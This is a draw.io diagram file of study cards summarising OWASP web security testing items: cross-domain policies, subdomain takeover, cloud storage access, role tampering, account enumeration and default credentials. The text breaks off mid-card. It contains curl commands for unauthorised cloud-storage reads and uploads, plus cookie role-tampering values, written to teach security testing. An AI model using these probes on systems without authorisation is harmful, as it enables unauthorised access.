        <mxCell id="Yyc6e-A1znXQ3ofwlieE-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-08&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test RIA Cross Domain Policy&lt;/h1&gt;&lt;p&gt;Rich Internet Applications (RIA) have adopted Adobe’s crossdomain.xml policy files to allow for controlled cross domain access to data and service consumption using technologies such as Oracle Java, Silverlight, and Adobe Flash.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Often the policy files that describe the access restrictions are poorly configured. Poor configuration of the policy files enables CSRF attacks.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;crossdomain.xml&lt;/b&gt; -&amp;nbsp;Java, Adobe Flash, Adobe Reader, etc.&lt;br&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;clientaccesspolicy.xml&lt;/b&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt; -&amp;nbsp;Silverlight, Microsoft.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Master policy&lt;/b&gt; files are located at the domain’s root. A client may be instructed to load a &lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;different policy&lt;/b&gt; file but it will always check the &lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;master policy&lt;/b&gt; file first to ensure that the &lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;master policy&lt;/b&gt; file permits the &lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;requested policy&lt;/b&gt; file.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Policy files grant several types of permissions:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Accepted policy files (Master policy files can disable or restrict specific policy files);&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Sockets permissions;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Header permissions;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;HTTP/HTTPS access permissions;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Allowing access based on cryptographic credentials.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;Attack vectors:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Overly permissive cross-domain policies.&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Generating server responses that may be treated as cross-domain policy files.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Using file upload functionality to upload files that may be treated as cross-domain policy files.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Try to retrieve the policy files crossdomain.xml and clientaccesspolicy.xml from the application’s root, and from every folder found.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;After retrieving all the policy files, the permissions allowed should be be checked under the least privilege principle.&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.cirt.net/nikto2&quot;&gt;Nikto&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://github.com/andresriancho/w3af&quot;&gt;W3af&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="700" width="400" x="440" y="3780" as="geometry" />
        </mxCell>
        <mxCell id="Yyc6e-A1znXQ3ofwlieE-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-09&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test File Permission&lt;/h1&gt;&lt;p&gt;Review and identify any rogue file permissions.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Filetypes to check:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Web files/directory;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Configuration files/directory;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Sensitive files (encrypted data, password, key)/directory;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Log files (security logs, operation logs, admin logs)/directory;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Executables (scripts, EXE, JAR, class, PHP, ASP)/directory;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Database files/directory;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Temp files /directory;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Upload files/directory.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;Set the permissions of the files and directories properly so that unauthorized users cannot access critical resources unnecessarily.&lt;/p&gt;&lt;p&gt;Tools:&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;a href=&quot;https://technet.microsoft.com/en-us/sysinternals/accessenum&quot;&gt;Windows AccessEnum&lt;/a&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;a href=&quot;https://technet.microsoft.com/en-us/sysinternals/accesschk&quot;&gt;Windows AccessChk&lt;/a&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;a href=&quot;https://linux.die.net/man/1/namei&quot;&gt;Linux namei&lt;/a&gt;.&lt;/span&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="360" width="400" x="440" y="4480" as="geometry" />
        </mxCell>
        <mxCell id="7wN0ui7vxEIaQb5FW4Om-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-10&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test for Subdomain Takeover&lt;/h1&gt;&lt;p&gt;The victim’s external DNS server subdomain record is configured to point to a non-existing or non-active resource/external service/endpoint.&lt;br&gt;&lt;/p&gt;&lt;p&gt;The service provider hosting the resource/external service/endpoint does not handle subdomain ownership verification properly.&lt;br&gt;&lt;/p&gt;&lt;p&gt;If the subdomain takeover is successful a wide variety of attacks are possible (serving malicious content, phising, stealing user session cookies, credentials, etc.).&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Enumerate all possible domains (previous and current).&lt;/li&gt;&lt;li&gt;Identify forgotten or misconfigured domains.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;To mitigate the risk of subdomain takeover the vulnerable DNS resource record(s) should be removed from the DNS zone.&lt;/p&gt;&lt;p&gt;Continous monitoring and periodic checks are recommended as best practice.&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://linux.die.net/man/1/dig&quot;&gt;dig&lt;/a&gt;, &lt;a href=&quot;https://github.com/lanmaster53/recon-ng&quot;&gt;recon-ng&lt;/a&gt;, &lt;a href=&quot;https://github.com/laramies/theHarvester&quot;&gt;theHarvester&lt;/a&gt;, &lt;a href=&quot;https://github.com/aboul3la/Sublist3r&quot;&gt;Sublist3r&lt;/a&gt;, &lt;a href=&quot;https://github.com/darkoperator/dnsrecon&quot;&gt;dnsrecon&lt;/a&gt;, &lt;a href=&quot;https://github.com/OWASP/Amass&quot;&gt;OWASP Amass&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="420" width="400" x="440" y="4840" as="geometry" />
        </mxCell>
        <mxCell id="7wN0ui7vxEIaQb5FW4Om-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-CONF-11&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test Cloud Storage&lt;/h1&gt;&lt;p&gt;Improper access control configuration, however, may result in sensitive information exposure, data being tampered, or unauthorized access.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Assess that the access control configuration for the storage services is properly in place.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;First identify the URL to access the data in the storage service, and then consider the following tests:&lt;/p&gt;&lt;p&gt;&lt;b&gt;read&lt;/b&gt; the unauthorized data (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;curl -X GET https://&amp;lt;cloud-storage-service&amp;gt;/&amp;lt;object&amp;gt;&lt;/i&gt;);&lt;br&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;upload&lt;/b&gt; a new arbitrary file (&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;curl -X PUT -d &#39;test&#39; &#39;https://&amp;lt;cloud-storage-service&amp;gt;/test.txt&#39;&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="320" width="400" x="440" y="5260" as="geometry" />
        </mxCell>
        <mxCell id="Fb2BFdzHm_OUc2j0esvg-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-IDNT-01&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test Role Definitions&lt;/h1&gt;&lt;p&gt;Identify and document roles used by the application.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Attempt to switch, change, or access another role.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Review the granularity of the roles and the needs behind the permissions given.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Identify the application roles:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Application documentation;&lt;/li&gt;&lt;li&gt;Guidance by the developers or administrators of the application;&lt;/li&gt;&lt;li&gt;Application comments and tips;&lt;/li&gt;&lt;li&gt;Fuzz possible roles (&lt;b&gt;cookies&lt;/b&gt; (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;role=admin&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;isAdmin=True&lt;/i&gt;), &lt;b&gt;account variables&lt;/b&gt; (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Role: manager&lt;/i&gt;), &lt;b&gt;hidden directories or files&lt;/b&gt; (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/admin&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/mod&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/backups&lt;/i&gt;), &lt;b&gt;well known users&lt;/b&gt; (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;admin&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;backups&lt;/i&gt;)).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;Try to switch roles and check available permissions.&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://github.com/Quitten/Autorize&quot;&gt;Burp’s Autorize extension&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;https://www.zaproxy.org/docs/desktop/addons/access-control-testing/&quot;&gt;ZAP’s Access Control Testing add-on&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="380" width="400" x="840" y="80" as="geometry" />
        </mxCell>
        <mxCell id="Fb2BFdzHm_OUc2j0esvg-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-IDNT-02&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test User Registration Process&lt;/h1&gt;&lt;p&gt;Some websites offer a user registration process that automates (or semi-automates) the provisioning of system access to users. The identity requirements for access vary from positive identification to none at all, depending on the security requirements of the system.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Verify that the identity requirements for user registration are aligned with business and security requirements.&lt;/li&gt;&lt;li&gt;Validate the registration process.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Verify that the identity requirements for user registration are aligned with business and security requirements:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Can anyone register for access?&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Are registrations vetted by a human prior to provisioning, or are they automatically granted if the criteria are met?&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Can the same person or identity register multiple times?&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Can users register for different roles or permissions?&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;What proof of identity is required for a registration to be successful?&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Are registered identities verified?&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;Validate the registration process:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Can identity information be easily forged or faked?&lt;/li&gt;&lt;li&gt;Can the exchange of identity information be manipulated during registration?&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Implement identification and verification requirements that correspond to the security requirements of the information the credentials protect.&lt;/p&gt;" vertex="1">
          <mxGeometry height="540" width="400" x="840" y="460" as="geometry" />
        </mxCell>
        <mxCell id="e7BPwF4WBmnO0DlB8rXr-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-IDNT-03&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Test Account Provisioning Process&lt;/h1&gt;&lt;p&gt;The provisioning of accounts presents an opportunity for an attacker to create a valid account without application of the proper identification and authorization process.&lt;/p&gt;&lt;p&gt;Verify which accounts may provision other accounts and of what type.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Determine which roles are able to provision users and what sort of accounts they can provision.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Is there any verification, vetting and authorization of provisioning/de-provisioning requests?&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Can an administrator provision other administrators or just users?&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Can an administrator or other user provision accounts with privileges greater than their own?&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Can an administrator or user de-provision themselves?&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;How are the files or resources owned by the de-provisioned user managed? Are they deleted? Is access transferred?&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="400" width="400" x="840" y="1000" as="geometry" />
        </mxCell>
        <mxCell id="e7BPwF4WBmnO0DlB8rXr-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-IDNT-04&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Account Enumeration and Guessable User Account&lt;/h1&gt;&lt;p&gt;It is possible to collect a set of valid usernames by interacting with the authentication mechanism of the application.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Web applications can reveal when a username exists on system, either as a consequence of mis-configuration or as a design decision (&lt;i&gt;when we submit wrong credentials, we receive a message that states that either the username is present on the system or the provided password is wrong&lt;/i&gt;) -&amp;gt; brute force or default username and password attack.&lt;br&gt;&lt;/p&gt;&lt;p&gt;The tester should interact with the authentication mechanism of the application to understand if sending particular requests causes the application to answer in different manners.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;HTTP Response Message&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;the server answer&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;for different cases (Valid Credentials,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Valid User with Wrong Password,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Nonexistent Username&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Analyzing the Error Code Received on Login Pages&lt;/b&gt;:&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Check&amp;nbsp;specific error codes or messages&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;for different cases.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Analyzing URLs and URLs Re-directions&lt;/b&gt;:&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;span style=&quot;background-color: light-dark(#ffffff, var(--ge-dark-color, #121212));&quot;&gt;http://www.foo.com/err.jsp?&lt;b style=&quot;&quot;&gt;User=baduser&lt;/b&gt;&amp;amp;&lt;/span&gt;&lt;b style=&quot;&quot;&gt;&lt;span style=&quot;background-color: light-dark(#ffffff, var(--ge-dark-color, #121212));&quot;&gt;Error=0&lt;/span&gt;&lt;br&gt;&lt;/b&gt;&lt;/span&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.foo.com/err.jsp?&lt;b style=&quot;&quot;&gt;User=gooduser&lt;/b&gt;&amp;amp;&lt;b style=&quot;&quot;&gt;Error=2&lt;/b&gt;&lt;/span&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;URI Probing&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.foo.com/&lt;b style=&quot;&quot;&gt;account1&lt;/b&gt;&lt;/span&gt; -&amp;gt;&amp;nbsp;&lt;b&gt;403 Forbidden&lt;/b&gt;&lt;br&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.foo.com/&lt;b style=&quot;&quot;&gt;account2&lt;/b&gt;&lt;/span&gt; -&amp;gt;&amp;nbsp;&lt;b style=&quot;background-color: transparent;&quot;&gt;404 file Not Found&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Analyzing Web Page Titles&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;User cannot authenticate to an application and receives a web page whose title is similar to&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;Invalid user or&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Invalid authentication.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Analyzing a Message Received from a Recovery Facility&lt;/b&gt;:&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;When use recovery&amp;nbsp;facility&amp;nbsp;a vulnerable application might return a message that reveals if a username exists or not&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Invalid username&lt;/b&gt;: &lt;i&gt;email address is not valid or the specified user was not found&lt;/i&gt;.&lt;br&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Valid username&lt;/b&gt;: &lt;i&gt;Your password has been successfully sent to the email address you registered with&lt;/i&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Friendly 404 Error Message&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;When we request a user within the directory that does not exist, we don’t always receive 404 error code. Instead, we may receive “200 ok” with an image, in this case we can assume that when we receive the specific image the user does not exist.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Analyzing Response Times&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Particularly where the request causes an interaction with an external service (such as sending a forgotten password email), this can add several hundred milliseconds to the response, which can be used to determine whether the requested user is valid.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Guessing Users&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;In some cases the user IDs are created with specific policies of administrator or company.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;CN00010&lt;b style=&quot;&quot;&gt;0&lt;/b&gt;&lt;/span&gt;,&amp;nbsp;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;CN00010&lt;b style=&quot;&quot;&gt;1&lt;/b&gt;&lt;/span&gt;, ...&lt;br&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;R&lt;b style=&quot;&quot;&gt;1&lt;/b&gt;00&lt;b style=&quot;&quot;&gt;1&lt;/b&gt;&lt;/span&gt;&amp;nbsp;(user &lt;b style=&quot;background-color: transparent;&quot;&gt;001&lt;/b&gt; for &lt;b style=&quot;background-color: transparent;&quot;&gt;REALM1&lt;/b&gt;),&amp;nbsp;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;R&lt;b style=&quot;&quot;&gt;2&lt;/b&gt;00&lt;b style=&quot;&quot;&gt;1&lt;/b&gt;&lt;/span&gt;&amp;nbsp;(user &lt;b style=&quot;background-color: transparent;&quot;&gt;001&lt;/b&gt; for &lt;b style=&quot;background-color: transparent;&quot;&gt;REALM2&lt;/b&gt;), ...&lt;/i&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Ensure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.&lt;/p&gt;&lt;p&gt;Ensure default system accounts and test accounts are deleted prior to releasing the system into production (or exposing it to an untrusted network).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://curl.haxx.se/&quot;&gt;curl&lt;/a&gt;, &lt;a href=&quot;https://www.perl.org/&quot;&gt;PERL&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="1240" width="400" x="840" y="1400" as="geometry" />
        </mxCell>
        <mxCell id="ht1xMTQ5JPkzByyCYWyc-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-IDNT-05&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Weak or Unenforced Username Policy&lt;/h1&gt;&lt;p&gt;User account names are often highly structured.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Determine whether a consistent account name structure renders the application vulnerable to account enumeration.&lt;/li&gt;&lt;li&gt;Determine whether the application’s error messages permit account enumeration.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Determine the structure of account names.&lt;/p&gt;&lt;p&gt;Evaluate the application’s response to valid and invalid account names.&lt;/p&gt;&lt;p&gt;Use different responses to valid and invalid account names to enumerate valid account names.&lt;/p&gt;&lt;p&gt;Use account name dictionaries to enumerate valid account names.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Ensure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.&lt;/p&gt;" vertex="1">
          <mxGeometry height="440" width="400" x="840" y="2640" as="geometry" />
        </mxCell>
        <mxCell id="ht1xMTQ5JPkzByyCYWyc-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-01&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Credentials Transported over an Encrypted Channel&lt;/h1&gt;&lt;p&gt;Assess whether any use case of the web site or application causes the server or the client to exchange credentials without encryption.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Capture traffic between a client and web application server that needs credentials.&lt;/li&gt;&lt;li&gt;Check for credentials transferred during login and while using the application with a valid session (prevent HTTP to HTTPS redirecting).&lt;/li&gt;&lt;li&gt;Look for sensitive data in&amp;nbsp;the captured traffic (passwords in message body, tokens in cookies, account or password reset codes).&lt;/li&gt;&lt;li&gt;Check different interraction types (Login, Account Creation, Password Reset, Change Password or Other Account Manipulation, Accessing Resources While Logged In).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Use HTTPS for the whole web site.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Implement &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc6797&quot;&gt;HSTS&lt;/a&gt; and redirect any HTTP to HTTPS.&lt;br&gt;&lt;/p&gt;&lt;p&gt;If it is cumbersome to switch to HTTPS, prioritize HTTPS for sensitive operations first.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Use free certificate authorities (&lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Let’s Encrypt&lt;/a&gt;).&lt;/p&gt;&lt;p&gt;Harden backend with &lt;a href=&quot;https://owasp.org/www-community/controls/SecureCookieAttribute&quot;&gt;Secure Cookie Attributes&lt;/a&gt; (&lt;i&gt;Set-Cookie: Secure&lt;/i&gt;).&lt;/p&gt;" vertex="1">
          <mxGeometry height="540" width="400" x="1240" y="80" as="geometry" />
        </mxCell>
        <mxCell id="ht1xMTQ5JPkzByyCYWyc-3" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-02&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Default Credentials&lt;/h1&gt;&lt;p&gt;Often applications are not properly configured after installation and the default credentials provided for initial authentication and configuration are never changed.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Enumerate the applications for default credentials and validate if they still exist.&lt;/li&gt;&lt;li&gt;Review and assess new user accounts and if they are created with any defaults or identifiable patterns.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Check that the known usernames and passwords for application.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Use login and password vocabularies, official documenation and search engine results for account enumeration.&lt;/p&gt;&lt;p&gt;Accounts&amp;nbsp;are often named after the application or organization.&lt;/p&gt;&lt;p&gt;Guess usernames based on contact info (email, full name) by applying the same naming convention.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Review the page source and JavaScript either through a proxy or by viewing the source for any references to users and passwords in the source (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;If username=&#39;admin&#39; then starturl=/admin.asp else /index.asp&lt;/i&gt;).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Look for 